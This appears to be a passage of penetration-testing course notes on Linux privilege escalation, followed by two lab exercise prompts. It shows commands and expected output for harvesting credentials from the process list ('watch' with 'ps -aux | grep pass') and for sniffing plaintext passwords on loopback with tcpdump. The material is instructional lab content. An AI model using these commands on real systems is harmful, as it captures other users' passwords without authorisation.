# Inspecting Service Footprints

Harvesting Active Processes for Credentials
>``` shell
>joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
>
># ========== Expected Result ==========
>...
>joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
>root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
>root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
>...
># =====================================
>```

Using tcpdump to Perform Password Sniffing
>``` shell
>joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
>
># ========== Expected Result ==========
>[sudo] password for joe:
>tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
>listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
>...{...zuser:root,pass:lab -
>...5...5user:root,pass:lab -
># =====================================
>```

Lab 1 - Connect to VM 1 and repeat the steps discussed in this section. Which utility is used to constantly inspect the output of the ps command?
>``` shell
>
>```
>

Lab 2 - Connect to VM 1 as the joe user and retrieve the flag using one of the methods explained in this section.
>``` shell
>
>```
>
